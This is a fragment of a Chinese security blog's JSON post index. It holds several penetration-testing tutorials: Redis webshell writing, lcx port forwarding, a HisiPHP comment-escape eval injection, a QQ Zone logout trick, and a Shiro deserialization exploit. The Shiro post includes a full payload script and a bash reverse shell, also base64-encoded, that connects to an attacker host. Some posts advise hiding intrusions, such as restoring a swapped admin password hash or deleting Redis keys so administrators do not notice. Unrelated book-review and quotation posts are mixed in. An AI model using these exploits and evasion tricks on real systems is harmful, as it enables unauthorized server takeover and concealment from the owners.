比如你上传的东西很大，那么我们可以使用这种办法","categories":[{"name":"兴趣爱好","slug":"兴趣爱好","permalink":"http://yoursite.com/categories/%E5%85%B4%E8%B6%A3%E7%88%B1%E5%A5%BD/"}],"tags":[{"name":"内网渗透","slug":"内网渗透","permalink":"http://yoursite.com/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"}]},{"title":"有数据库修改权限并且想登陆后台但密码不可逆的小思路解决办法","slug":"有数据库修改权限并且想登陆后台但密码不可逆的小思路解决办法","date":"2019-12-23T02:37:37.000Z","updated":"2020-01-31T19:38:37.672Z","comments":true,"path":"2019/12/23/有数据库修改权限并且想登陆后台但密码不可逆的小思路解决办法/","link":"","permalink":"http://yoursite.com/2019/12/23/%E6%9C%89%E6%95%B0%E6%8D%AE%E5%BA%93%E4%BF%AE%E6%94%B9%E6%9D%83%E9%99%90%E5%B9%B6%E4%B8%94%E6%83%B3%E7%99%BB%E9%99%86%E5%90%8E%E5%8F%B0%E4%BD%86%E5%AF%86%E7%A0%81%E4%B8%8D%E5%8F%AF%E9%80%86%E7%9A%84%E5%B0%8F%E6%80%9D%E8%B7%AF%E8%A7%A3%E5%86%B3%E5%8A%9E%E6%B3%95/","excerpt":"","text":"办法一 比如我们在获取了mysql数据库的用户名和密码后，登入进去，发现后台管理员的密码是贵那么长的数字，且不可逆，然后我们需要获取webshell，那么我们的扩展面可能就得去后台找上传点、命令执行什么的获取shell了 我之前实战过程中就遇到了这样的情况，那么我的解决方法是（口头描述） 1、把后台用户所有的账户导出来，然后将密码设为123456，爆破用户名2、假设跑出了用户名为Fuck11的密码为123456，然后我们可以去数据库看123456加密后的密码是!@#$$#@!ffuucckk!!875421，那么我们可以将管理员的密码先复制到某个地方备份下来，然后将123456加密后的字符UPDATE上去3、登陆成功后，将管理员原先的加密密码再UPDATE上去（记住一定要备份！！！ 否则管理员突然间发现登陆不上了，一般都会关站检查改密码之类的操作，给发现一次可能就把漏洞修复了数据库密码改了）4、然后就在后台某点发现了上传点成功上传shell 办法二 有fuckall的md5密码，但解不出来 我们可以撞库，思路如下 围绕用户名fuckall，制作社工密码字典，就比如你生日是13月68号，然后你叫王德发，然后平常人可能会根据自身信息来设密码，如1368wdf、wdf1368，然后将1368wdf或wdf1368进行MD5加密，然后对比一下，对比成功后加密的MD5对应的明文密码是什么那不可逆的MD5的密码就是什么了。 如yangyangwithgnu师傅文章中的","categories":[{"name":"兴趣爱好","slug":"兴趣爱好","permalink":"http://yoursite.com/categories/%E5%85%B4%E8%B6%A3%E7%88%B1%E5%A5%BD/"},{"name":"技巧","slug":"兴趣爱好/技巧","permalink":"http://yoursite.com/categories/%E5%85%B4%E8%B6%A3%E7%88%B1%E5%A5%BD/%E6%8A%80%E5%B7%A7/"}],"tags":[{"name":"小技巧","slug":"小技巧","permalink":"http://yoursite.com/tags/%E5%B0%8F%E6%8A%80%E5%B7%A7/"}]},{"title":"redis漏洞复现写入webshell以及删除建议","slug":"redis漏洞复现写入webshell以及删除建议","date":"2019-12-23T02:33:42.000Z","updated":"2019-12-23T02:36:37.847Z","comments":true,"path":"2019/12/23/redis漏洞复现写入webshell以及删除建议/","link":"","permalink":"http://yoursite.com/2019/12/23/redis%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%86%99%E5%85%A5webshell%E4%BB%A5%E5%8F%8A%E5%88%A0%E9%99%A4%E5%BB%BA%E8%AE%AE/","excerpt":"","text":"本地漏洞环境搭建1wget http:&#x2F;&#x2F;download.redis.io&#x2F;releases&#x2F;redis-3.2.0.tar.gz2tar xzf redis-3.2.0.tar.gz3cd redis-3.2.04make 修改配置文件为可以远程访问 1gedit redis.conf 把bind 127.0.0.1前面加上#注释掉把protected-mode设为no 启动redis 1.&#x2F;src&#x2F;redis-server redis.conf 环境介绍 靶机IP：192.168.31.131攻击IP：192.168.31.129 攻击过程探测目标机是否有redis1nmap 192.168.31.131 -A -p 6379 –script redis-info 探测出有redis服务，使用如下命令连接，查看是否存在未授权 1redis-cli -h 靶机IP 连接成功，那么我们使用redis来进行反弹shell 写入文件假设我靶机存在这么一个目录是web目录，且是php脚本，那么我们可以使用如下命令来进行写入shell（前提是知道目标机的网站目录的绝对路径） 然后使用redis对其目录写入phpinfo() 1192.168.31.131:6379&gt; config set dir &#x2F;root&#x2F;web2OK3192.168.31.131:6379&gt; config set dbfilename shell.php4OK5192.168.31.131:6379&gt; set x &quot;&lt;?php phpinfo();?&gt;&quot;6OK7192.168.31.131:6379&gt; save8OK 然后就会在靶机的/root/web目录下写入shell.php 但是我们利用redis写入的shell是会加入很多其他数据的，如图 但是php是具有容错性的，哪怕这样也是可以执行phpinfo() 成功写入shell后，如果不想被管理员发现，除了将木马写隐蔽和免杀外还要将你写入的key删除，比如我上面是用set x &quot;&lt;?php phpinfo();?&gt;&quot;，那么我要将x变量删除 注意：如果这里是实战环境，最好不要执行keys *命令，因为如果他们设置的key很多很多，几十万几百万条的话查看key数据可能会把服务器的cpu直接跑满，严重的说机器会直接崩溃，那么我们只要记住写入的key名，然后写完shell后将其del即可，因为这里是我演示的，所以才进行这个错误的示范 其实redis不仅可以写入webshell还可以反弹shell，但是我一般需求就是获取webshell即可，但是如果目标系统对写入的shell解析有问题，那么我们就不得不反弹shell了（网上有很多这类文章，不写了，一样的）","categories":[{"name":"兴趣爱好","slug":"兴趣爱好","permalink":"http://yoursite.com/categories/%E5%85%B4%E8%B6%A3%E7%88%B1%E5%A5%BD/"}],"tags":[{"name":"Web安全","slug":"Web安全","permalink":"http://yoursite.com/tags/Web%E5%AE%89%E5%85%A8/"}]},{"title":"lcx端口转发","slug":"lcx端口转发","date":"2019-12-21T18:10:35.000Z","updated":"2019-12-21T18:17:25.287Z","comments":true,"path":"2019/12/22/lcx端口转发/","link":"","permalink":"http://yoursite.com/2019/12/22/lcx%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/","excerpt":"","text":"简介 Lcx是一个端口的转发工具，可以将内网的端口给转发到外网的机器上，然后就可以去连接远程对方内网 简单来说就是，a机器我可以执行命令，但是我想连接他的3389，但是禁止外网连接，那么我们可以用lcx来把3389端口的流量，转发到我们机器(必须外网可以访问过来)的其他端口，比如5555端口，然后连接只要连接127.0.0.1:5555就可以连接a机器的3389了。 用法把lcx上传到目标服务器（比如我们可以把lcx.exe上传到www.xxx.com地址，然后lcx.exe就变成了www.xxx.com/lcx.exe，然后在目标机器上执行wget讲起下载到目标服务器） 然后执行如下命令 1本机：lcx.exe -listen 51 33891 注意：本机必须要外网服务器，就是别人可以访问你的&#96;ip&#96;2目标服务器:lcx.exe -slave 公网ip 51 目标服务器ip 3389 本机执行的命令意思为： 利用lcx.exe监听本地51端口，然后讲起转到33891端口 目标服务器执行的命令为： 利用lcx.exe去连接本机ip的51端口，并且将目标服务器的3389端口转发给他 攻击机： 受害机： 然后直接连接攻击机的33891端口即可","categories":[{"name":"兴趣爱好","slug":"兴趣爱好","permalink":"http://yoursite.com/categories/%E5%85%B4%E8%B6%A3%E7%88%B1%E5%A5%BD/"}],"tags":[{"name":"内网渗透","slug":"内网渗透","permalink":"http://yoursite.com/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"}]},{"title":"从0开始学内网渗透资料","slug":"从0开始学内网渗透","date":"2019-12-21T11:29:24.000Z","updated":"2019-12-21T11:30:44.236Z","comments":true,"path":"2019/12/21/从0开始学内网渗透/","link":"","permalink":"http://yoursite.com/2019/12/21/%E4%BB%8E0%E5%BC%80%E5%A7%8B%E5%AD%A6%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/","excerpt":"","text":"https://github.com/l3m0n/pentest_study","categories":[{"name":"兴趣爱好","slug":"兴趣爱好","permalink":"http://yoursite.com/categories/%E5%85%B4%E8%B6%A3%E7%88%B1%E5%A5%BD/"}],"tags":[{"name":"内网渗透","slug":"内网渗透","permalink":"http://yoursite.com/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"}]},{"title":"不知道标题的文章","slug":"不知道标题的文章","date":"2019-12-19T07:11:17.000Z","updated":"2019-12-20T16:51:22.879Z","comments":true,"path":"2019/12/19/不知道标题的文章/","link":"","permalink":"http://yoursite.com/2019/12/19/%E4%B8%8D%E7%9F%A5%E9%81%93%E6%A0%87%E9%A2%98%E7%9A%84%E6%96%87%E7%AB%A0/","excerpt":"","text":"写了很多，不好意思发出来。","categories":[{"name":"日记","slug":"日记","permalink":"http://yoursite.com/categories/%E6%97%A5%E8%AE%B0/"}],"tags":[{"name":"生活","slug":"生活","permalink":"http://yoursite.com/tags/%E7%94%9F%E6%B4%BB/"}]},{"title":"利用shiro反序列化漏洞反弹shell获取目标服务器权限","slug":"利用shiro反序列化漏洞反弹shell获取目标服务器权限","date":"2019-12-19T06:36:25.000Z","updated":"2020-01-31T18:43:49.195Z","comments":true,"path":"2019/12/19/利用shiro反序列化漏洞反弹shell获取目标服务器权限/","link":"","permalink":"http://yoursite.com/2019/12/19/%E5%88%A9%E7%94%A8shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%8F%8D%E5%BC%B9shell%E8%8E%B7%E5%8F%96%E7%9B%AE%E6%A0%87%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%9D%83%E9%99%90/","excerpt":"","text":"漏洞发现 只要在cookie中传递rememberMe=awdawd，然后返回包存在rememberMe=deleteMe;的都可能存在shiro反序列化漏洞 安装工具1git clone https:&#x2F;&#x2F;github.com&#x2F;frohoff&#x2F;ysoserial.git 安装mvn 1apt install maven 然后执行 1mvn package -DskipTests 就会生成一个target目录，全部工具都在下面 还有一个工具是构造恶意rememberMe的，下面会讲用法（我将其存为1.py） 1import sys2import uuid3import base644import subprocess5from Crypto.Cipher import AES6 7def encode_rememberme(command): #ysoserial-0.0.6-SNAPSHOT-all.jar #文件需要在该文件目录89 popen = subprocess.Popen(['java', '-jar', 'ysoserial-0.0.6-SNAPSHOT-all.jar', 'JRMPClient', command], stdout=subprocess.PIPE)10 BS = AES.block_size11 pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()12 key = base64.b64decode(\"kPH+bIxk5D2deZiIxcaaaA==\")13 iv = uuid.uuid4().bytes14 encryptor = AES.new(key, AES.MODE_CBC, iv)15 file_body = pad(popen.stdout.read())16 base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))17 return base64_ciphertext18 19 20if __name__ == '__main__':21 payload = encode_rememberme(sys.argv[1])22 print \"rememberMe=&#123;0&#125;\".format(payload.decode()) 漏洞环境1xxx.xxx.xx1 攻击机（一定要是外网的，否则无法反弹shell）2xxx.xxx.xx2 目标机 复现过程1、构造恶意rememberMe 1python 1.py xxx.xxx.xx1:PORT1 2、制作bash反弹shell命令 1bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;xxx.xxx.xx1&#x2F;外网服务器监听端口（我用的是448） 0&gt;&amp;1 然后要放到http://www.jackson-t.ca/runtime-exec-payloads.html加密，因为他放入`rememberMe`会解`base64` 3、然后使用ysoserial的监听模块监听PORT1端口（第一步生成rememberMe的端口） 1java -cp ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.JRMPListener 4321 CommonsCollections5 &#39;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xNjUuMjIuNDkuMTcvNDQ4IDA+JjE&#x3D;&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&#39; 4、监听第二步制作的反弹shell的端口 1nc -lvp 448 5、然后在目标站上抓包，在cookie里加入第一步生成的rememberMe 然后就可以看到nc反弹过来的shell 成功获取shell，由于是linux，所以无后续。","categories":[{"name":"兴趣爱好","slug":"兴趣爱好","permalink":"http://yoursite.com/categories/%E5%85%B4%E8%B6%A3%E7%88%B1%E5%A5%BD/"},{"name":"好文","slug":"兴趣爱好/好文","permalink":"http://yoursite.com/categories/%E5%85%B4%E8%B6%A3%E7%88%B1%E5%A5%BD/%E5%A5%BD%E6%96%87/"}],"tags":[{"name":"Hacker","slug":"Hacker","permalink":"http://yoursite.com/tags/Hacker/"}]},{"title":"文艺彩句","slug":"文艺彩句","date":"2019-12-18T01:43:15.000Z","updated":"2019-12-18T01:52:39.924Z","comments":true,"path":"2019/12/18/文艺彩句/","link":"","permalink":"http://yoursite.com/2019/12/18/%E6%96%87%E8%89%BA%E5%BD%A9%E5%8F%A5/","excerpt":"","text":"来自知乎话题：https://www.zhihu.com/question/65283816 关于人生 这世界本就没有任何一句话，可以让你醍醐灌顶。真正叫你醍醐灌顶的，只能是一段经历。而那句话，只是火药仓库内划燃的一根火柴。 少年不识愁滋味，爱上层楼。爱上层楼。为赋新词强说愁。而今尝尽愁滋味，欲说还休。欲说还休。却道天凉好个秋。——辛弃疾 怕是当年眉清目秀清澈如许的少年，经年也成了推杯换盏乌烟瘴气的嘴脸。 当你穿过了暴风雨，你就不再是原来的那个人。 人生最可怕的事 是一边后悔一边生活，而不是孤单。 我们讲起年少时，常因短时的无望，联想到今生。那时候的憧憬都好热烈，扬言要受苦，要从蒙昧中解缚。连怀缅方式都妥帖规划。生命虽未完成，但那应该是一种自由 虽然我们互相笑着说再见，但是我们都心知肚明，分离即永别。 关于爱情 怕是当年眉清目秀清澈如许的少年，经年也成了推杯换盏乌烟瘴气的嘴脸。 运气好的话，你会遇到一个保护你的天真、让你安心当小朋友的人。 我先过银河，但我只爱星星。 你笑时，雷声温柔，暴雨无声。 关于理想 以凡人之躯比肩神明 你们一直抱怨这个地方，但是你们却没有勇气走出这里。","categories":[{"name":"关于生活","slug":"关于生活","permalink":"http://yoursite.com/categories/%E5%85%B3%E4%BA%8E%E7%94%9F%E6%B4%BB/"}],"tags":[{"name":"人生BUFF","slug":"人生BUFF","permalink":"http://yoursite.com/tags/%E4%BA%BA%E7%94%9FBUFF/"}]},{"title":"qq空间一处有趣的拒绝服务","slug":"qq空间一处有趣的拒绝服务","date":"2019-12-18T01:31:16.000Z","updated":"2020-01-31T18:45:40.154Z","comments":true,"path":"2019/12/18/qq空间一处有趣的拒绝服务/","link":"","permalink":"http://yoursite.com/2019/12/18/qq%E7%A9%BA%E9%97%B4%E4%B8%80%E5%A4%84%E6%9C%89%E8%B6%A3%E7%9A%84%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1/","excerpt":"","text":"作者是这个漏洞思路的原创，我写这个漏洞的时候未在互联网上看过相关资料还有如img引入退出链接导致拒绝服务也是本人原创的（我敢保证写退出文章前未有此思路），本文写于18年，因为博客刚写。 还有几个类似案例也是我写的 https://bbs.ichunqiu.com/forum.php?mod=viewthread&amp;tid=46282 漏洞过程1、发送如下数据包 1POST &#x2F;cgi-bin&#x2F;qzshare&#x2F;cgi_qzshareadd_url?g_tk&#x3D;1395430061&amp;qzonetoken&#x3D;3ca935b4acf8031d273301661877e5b2c7d888e0655d828df4496c05672e3898a1842753399054f2affef6ad HTTP&#x2F;1.12Host: sns.qzone.qq.com3User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko&#x2F;20100101 Firefox&#x2F;52.04Accept: *&#x2F;*5Accept-Language: zh-CN,zh;q&#x3D;0.8,en-US;q&#x3D;0.5,en;q&#x3D;0.36Accept-Encoding: gzip, deflate7Content-Type: application&#x2F;x-www-form-urlencoded8Referer: https:&#x2F;&#x2F;sns.qzone.qq.com&#x2F;cgi-bin&#x2F;qzshare&#x2F;cgi_qzshare_onekey?desc&#x3D;%E6%B5%8B%E8%AF%95%E4%B8%80%E4%B8%8B%E5%95%A6~&amp;url&#x3D;http:&#x2F;&#x2F;www.qq.com&amp;showcount&#x3D;1&amp;desc&#x3D;123&amp;pics&#x3D;http:&#x2F;&#x2F;www.slimego.cn&#x2F;images&#x2F;logo.png9Content-Length: 30010Cookie: 这是cookie11DNT: 112Connection: close1314where&#x3D;0&amp;entryuin&#x3D;1900065568&amp;spaceuin&#x3D;1900065568&amp;title&#x3D;123321&amp;summary&#x3D;123321&amp;token&#x3D;1395430061&amp;sendparam&#x3D;&amp;description&#x3D;%E6%B5%8B%E8%AF%95%E4%B8%80%E4%B8%8B%E5%95%A6~&amp;type&#x3D;4&amp;url&#x3D;http%3A%2F%2Fwww.qq.com&amp;site&#x3D;&amp;to&#x3D;&amp;share2weibo&#x3D;0&amp;pics&#x3D;https:&#x2F;&#x2F;pay.qq.com&#x2F;cgi-bin&#x2F;login&#x2F;user_logout.cgi?1.png&amp;fupdate&#x3D;1&amp;notice&#x3D;1 注意这里的pics参数，这个值是一个 类似退出的url 那么这里的思路就是 用户点开空间然后&lt;img src=https://pay.qq.com/cgi-bin/login/user_logout.cgi?1.png&gt;，如图 导致用户后台自动访问退出的url(但是腾讯空间的退出url存在token，所以这是另一处清除域cookie的url) 那么来测试一下，有另一个号 点开空间 然后在刷新一下就会退出 那么现在的危害就是，让我刷空间的好友 后台自动访问退出的url 然后导致无法正常操作 如评论、点赞、转发、发说说等 并且会一直跳转到登录处 所以个人觉得危害还是挺大的 而且这个方法还可以利用为获取到谁访问了qq空间（这个是针对那些黄钻会员隐藏了空间来源访问），那么我们就可以写入一个来源访问系统的，然后利用Referer所传递的值来知道是谁访问了我的qq空间（当我们登录qq空间后 会将手机号带入到url中，所以可以获取到访问我qq空间的用户的qq号，虽然危害不大 但是还算是一个设计缺陷 导致了外联可以访问）","categories":[{"name":"兴趣爱好","slug":"兴趣爱好","permalink":"http://yoursite.com/categories/%E5%85%B4%E8%B6%A3%E7%88%B1%E5%A5%BD/"},{"name":"好文","slug":"兴趣爱好/好文","permalink":"http://yoursite.com/categories/%E5%85%B4%E8%B6%A3%E7%88%B1%E5%A5%BD/%E5%A5%BD%E6%96%87/"}],"tags":[{"name":"Web安全","slug":"Web安全","permalink":"http://yoursite.com/tags/Web%E5%AE%89%E5%85%A8/"}]},{"title":"一个不存在的会议议题","slug":"一个不存在的会议议题","date":"2019-12-18T01:29:16.000Z","updated":"2020-01-31T18:47:58.325Z","comments":true,"path":"2019/12/18/一个不存在的会议议题/","link":"","permalink":"http://yoursite.com/2019/12/18/%E4%B8%80%E4%B8%AA%E4%B8%8D%E5%AD%98%E5%9C%A8%E7%9A%84%E4%BC%9A%E8%AE%AE%E8%AE%AE%E9%A2%98/","excerpt":"","text":"这本是一个会议议题的，然后没选上。 会议内容技巧我会对所测试过的系统、挖掘的漏洞写在一个页面中 暂时是手工添加很尴尬。。。以后就想把测试系统的burp日志包都抓下来，然后用脚本匹配自动化写入到这里。 1、为了查漏补缺2、为了可以扩展漏洞3、为了其他漏洞出来后我可以马上定位漏洞点 信息收集心得对一个系统进行挖掘最重要的就是信息收集部分，对一个系统收集的越多、攻击链就越大，下面就是我在漏洞挖掘中一些信息收集的心得 https://www.zybuluo.com/mdeditor#1484882 一般拿到系统我会先用如下语法查看他是否有后台手册、或者开发手册（都是为了看看有没有弱口令等敏感信息） 1google语法2site:ooxx.com filetype:xls34百度云盘搜索xx厂商，然后选取看文档文件的类型 然后会进行找后台地址 1site:xxx.xxx admin2site:xxx.xxx login3site:xxx.xxx system4site:xxx.xxx 管理5site:xxx.xxx 登录6site:xxx.xxx 内部7site:xxx.xxx 系统 或者找邮箱进行钓鱼（用低位的跳转漏洞，让管理员打开钓鱼页面） 1site:xxx.xxx 邮件2site:xxx.xxx email 找对应的漏洞（比较没效率） 1site:xxx.com inurl:jmx-console2site:xxx.com inurl:&#x2F;public&#x2F;index.php3... ... 使用github来搜索厂商敏感信息 案例一在对一个系统挖掘的时候他有一个如下的url看收货地址 1http:&#x2F;&#x2F;www.xxx.xxx&#x2F;xxx.html?xxxid&#x3D;2018WOIDJWOIDJ5201314 然后可以用搜索引擎来对其进行搜索，并且成功发现几十个的用户收货地址 1site:xxx.xxx inurl:xxxid&#x3D;20 当然这个用法还可以用来对已挖掘的漏洞查找更多漏洞（以洞找洞），比如www.xxx.com下的域名的一个参数searchxxx存在xss漏洞，然后我可以用搜索引擎来找更多的xss漏洞 1site:xxx.com inurl:searchxxx&#x3D; 并且找出其他2个xss漏洞 案例二这个是一个驻场的项目，给的环境是用他们电脑然后可以黑盒+白盒，然后我利用黑盒（看js然后拼接）找出了一个接口（http://xxx.xxx.xxx/api/getxxxx.html然后post传递的是xxxname=这里因为在公司内部，很容易看到其他员工的名字直接改成拼音），这个接口打开然后发现是可以获取用户的登录时间、账号密码（加密）等，但是因为这里的密码是加密的，然后我让另一个白盒的朋友去找出对应的加密函数并且解密了密码，就直接登录了他们的员工系统 案例三上传处只能上传.txt、.png、.jpg等（白名单），然后我后面发现了一个回收功能和window这样子是一样的，就是可以拖进去然后拖出来，但是在期间抓包的时候，发现他拖到里面再拖出来的时候，参数是这样的 1fname&#x3D;xxx.txt&amp;fid&#x3D;1455230&amp;content&#x3D;&lt;?php echo 1?&gt; 然后我把fname改成了1.php可以打开的，但是没有解析为php脚本，然后改成了1.html就可以解析为html，当成存储xss 有趣的漏洞利用waf和退出功能来对网站产生影响业务的漏洞 https://bbs.ichunqiu.com/forum.php?mod=viewthread&amp;tid=46282https://www.zybuluo.com/1kbfree/note/1359028","categories":[{"name":"兴趣爱好","slug":"兴趣爱好","permalink":"http://yoursite.com/categories/%E5%85%B4%E8%B6%A3%E7%88%B1%E5%A5%BD/"},{"name":"思路","slug":"兴趣爱好/思路","permalink":"http://yoursite.com/categories/%E5%85%B4%E8%B6%A3%E7%88%B1%E5%A5%BD/%E6%80%9D%E8%B7%AF/"}],"tags":[{"name":"Web安全","slug":"Web安全","permalink":"http://yoursite.com/tags/Web%E5%AE%89%E5%85%A8/"}]},{"title":"[每周推荐]《以幽默的方式过一生》","slug":"每周推荐-《以幽默的方式过一生》","date":"2019-12-18T01:04:30.000Z","updated":"2019-12-18T01:10:54.326Z","comments":true,"path":"2019/12/18/每周推荐-《以幽默的方式过一生》/","link":"","permalink":"http://yoursite.com/2019/12/18/%E6%AF%8F%E5%91%A8%E6%8E%A8%E8%8D%90-%E3%80%8A%E4%BB%A5%E5%B9%BD%E9%BB%98%E7%9A%84%E6%96%B9%E5%BC%8F%E8%BF%87%E4%B8%80%E7%94%9F%E3%80%8B/","excerpt":"","text":"本书介绍《以幽默的方式过一生》是中信出版社在2017年6月出版的图书，作者是琢磨先生 作者介绍琢磨先生，原名郭城，财富管理专家，新锐经济学者，一位罕见的能将哲学、心理学和经济学融会贯通的人，被媒体评价为“人性的手术刀，又给人温暖向善的力量。” 财经第一媒体平台功夫财经的签约嘉宾，广东卫视《财经郎眼》脱口秀策划人，中山大学客座教授，剧场脱口秀演出策划人，在各地的脱口秀演出巡演一票难求。 出版著作《客户服务工具集》、《水煮西游记》和《培训师》。 书籍目录【立春】万物复苏，莺啼燕舞人生中的选择身为小姐不能有感觉了再接客所有的伟大，都源于一个勇敢的开始【雨水】鸿雁归来，草木萌动生活就是心怀最大的善意在荆棘中穿行你对了又怎样机场遇到初恋女友爱是个动词【惊蛰】春雷惊蛰，杨绿风急书架奇遇记带书去旅行阅读的快乐【春分】黄赤相交，草长莺飞我路过的城市和girls我是个爱逛街的人机场里的小旅行【清明】春雨如丝，思念如凄一转身，就是一辈子世界的孤儿凡是发生的必然发生【谷雨】谷雨断霜，万物生长找个能说话的人结婚我老婆是这样驯化我的我就不信管不了这个家【立夏】万物并秀，各守其色自己和别人的关系朋友如三餐有些事，不必说破童真的故事有什么好挤的【小满】小满不满，本色内敛爱情，并不是生命的全部毛坯恋人爱情里最容易犯贱【芒种】适时播种，方期有成任何情况下，提升自己最重要职场的建议接受不完美的自己【夏至】梅雨纷飞，一夜生阴理发师的手艺衣橱里的秘密当我开车的时候，我在想什么跟楼上两口子斗争的七个夜晚【小暑】温如小暑，杀气未素三种男人的人生四种女人的人生其实你没必要活得那么紧张【大暑】三伏叠出，何以解暑社交时代的病人聊天中的符号微信头像和名字【立秋】清风徐来，志在外也孤独的力量给自己藏点小幸福天地间的第一个人人性难断【处暑】物极必反，处暑应寒婚后遇到更喜欢的人恋爱模式心理学里如何定义爱情【白露】阴气渐重，幽径多蹊你那点事，有什么好说的人性中最容易犯贱的地方觉得别人晒，可能是自己缺【秋分】秋风乍起，息声问道秋天，我迷失于一片竹林星座靠谱吗算卦准不准【寒露】寒气凝结，精灵出没灵感捕手嗑瓜子人生第一次动手术踮着脚尖得到的东西【霜降】大地蒙霜，草木落黄从青春年少路过一个四十岁的男人给你提个醒以幽默的方式过一生【立冬】土气凝寒，万物收藏你为什么赚不到钱花钱的原则借钱的艺术【小雪】瑞雪丰年，吉象立现生下来，还要会教育有其父必有其子【大雪】冰雪寒天，勿忘前川出发太久，别忘记目的地不是每个人的意见都值得倾听每个不能打败我的事件，都会把我变得更加璀璨【冬至】西北风袭，回笼教至回笼教大V 经典段这本书的写法是非常幽默，读起来非常通俗易懂并且符合社会逻辑。书中讲解了生活上、事业上、人际上、哲学上、爱情上等很多领域。 琢磨先生在第一篇“立春”就讲过人生的路归纳起来无非两条：一条用来实践，就是正在走的这条；一条用来遗憾，没事想想就好了。也阐述了这么个观点“人生总会因为没有选择那条路而遗憾，因为人生是无法穷尽所有选择的，但人生无需遗憾，因为注定发生的事情终究会发生，只要是自己选择的路就不要太在意结果，路途是荆棘还是风景，接受就好” 也提到了一个总有那么点的感觉，就是人生往往在不经意间，就会向另一个方向发展。 还说了有所得必有所失，比如我的职业是网络安全工程师，那么我接触的电脑久学习时间长，我技术会有所提升，陪伴身边人的时间就会少。如果陪伴身边人的时间说，接触电脑和学习时间就会比较短，但是这都是自己的选择，只要得之心所想，失之情所愿就行 琢磨先生认为：生活，就是心怀最大的善意在荆棘中穿行。即使被刺伤，亦不改初衷。 顺势而为，随遇而安。知错即改，迷途知返。 在喜欢自己的人身上用心，在不喜欢自己的人身上健忘。 所以我觉得主要的就是尊重自己的选择，并要为自己的选择付出责任，即要为人生负责。 琢磨先生还从身边发生的事情简单的阐述了，也就是“所有的伟大，都涌于一个勇敢的开始”，我觉得这句话非常的对，不管做哪件事情难的都是第一步，第一步决定了是否有关键的最后一步，所有很多事情，只要迈出第一步，就根本停不下来。但前提是，你得开始，所以很多人离优秀只差一个开始。 琢磨先生说过：“一个坏朋友对你最大的打击，不是破坏了友谊，而是让你不再投入这份真诚。你的坏爱人对你最大的打击不是让你伤痕累累，而是让你再也不敢投入情感，挫败也好，伤害也好，总会成为过去，都会成为浮云。可怕的，是你用这些过去，绑架了自己的未来、”，同样的道理，不能因为一个人骗过你，而失去对所有人的信任。 琢磨先生说过：“过日子，又不是审稿子，不涉及原则性的问题，你何苦要别人每个字都对？每句话都符合逻辑？每个段落都要照顾你的情绪？你只需要有时当作通假字，有时当作倒装句，有时当作比喻暗示，即可。在成人世界里，精确，是一件残忍的处世方式。糊涂，谁说不是一种高智商的生活态度。”，这句话我深有体会，下面我想说的是我个人的观点，我不知对与错，但在我的世界观里是觉得不妥的。记得在之前上课的时候，课堂氛围是死气沉沉的，但是我不喜欢这样，所以我经常会活泼并且滑稽的回答问题，这段时间很显然的提高的课堂效率，睡觉的同学少了，和我一起回答问题的人多了，但是当时老师是非常严厉的批评我的，他说我是在扰乱课堂，给我念’xxx守则’说我这是不对的，，，然后我就再也没有积极回答过问题，上课氛围依旧变得死气沉沉的，然而我并不觉得这个“对”是好的；我更认为的是解决问题大于纠结对错。 成熟的定义是能互相理解对方 在爱情上，在谁身上开始，也需要在谁身上结束。不要谈着现任，心里还想着前任，否则你的爱情线不会幸福的。 要想爱情幸福还有一个很重要，爱要相互理解，关系、尊重和了解对方 其实不读书也没什么坏处，只是太过沉溺于现实世界，容易让人狗苟蝇营。比如，你可以通过读一本传记，窥见别人的人生。你可以读一本心理学的书，洞悉自我的处境。你可以读一本历史的书，看刀光剑影，明白再辉煌的生命也会尘埃落定。读书，让你在历史、未来、现实、空虚中来回穿梭，然后发现自己生活的更多可能。 待续 这是个技术博客，也是个写作博客，因为我希望我的人生除了在事业上有所成就，还要知书达理。","categories":[{"name":"书品人生","slug":"书品人生","permalink":"http://yoursite.com/categories/%E4%B9%A6%E5%93%81%E4%BA%BA%E7%94%9F/"}],"tags":[{"name":"生活鸡汤","slug":"生活鸡汤","permalink":"http://yoursite.com/tags/%E7%94%9F%E6%B4%BB%E9%B8%A1%E6%B1%A4/"}]},{"title":"一次渗透测试拿下shell过程","slug":"一次渗透测试拿下shell过程","date":"2019-12-18T00:13:22.000Z","updated":"2019-12-18T00:56:42.141Z","comments":true,"path":"2019/12/18/一次渗透测试拿下shell过程/","link":"","permalink":"http://yoursite.com/2019/12/18/%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%8B%BF%E4%B8%8Bshell%E8%BF%87%E7%A8%8B/","excerpt":"","text":"漏洞过程 爆破账号密码，获取了管理员权限 这个是HisiPHP的后台，找到了相关漏洞复现 上传shell，用菜刀连接 linux… 无后续 复现过程爆破弱口令登陆的时候有温馨提醒，如下这样 这就说明账号正确，但是密码不正确，那就跑admin账户的，然后经过测试发现密码是123456dcba 进后台getshell1、打开系统 -&gt; 插件 2、然后在插件标题处填写如下内容 aaa1*/@eval($_REQUEST[a]);/* 这里的原理是因为我们写的插件标题会在一个php文件里的注释里如我的插件标题为aaa1*/@eval($_REQUEST[a]);/*，就会在php文件里变成这样 1...2/**3 * aaa*/@eval($_REQUEST[a]);/*插件4 * @package plugins\\awd5 */6... 因为用*/把第一段注释给闭合了，然后用/*把后面的注释闭合了，导致绕过可以执行php代码 然后程序会自动返回插件地址在哪，然后直接打开带参数就可以执行php代码了 3、因为这里的执行代码在后台，是需要登录的，比较麻烦，然后我就在其他目录写了一个shell 首先获取绝对路径（把页面弄报错，thinkphp开启了debug的话都可以看目录） 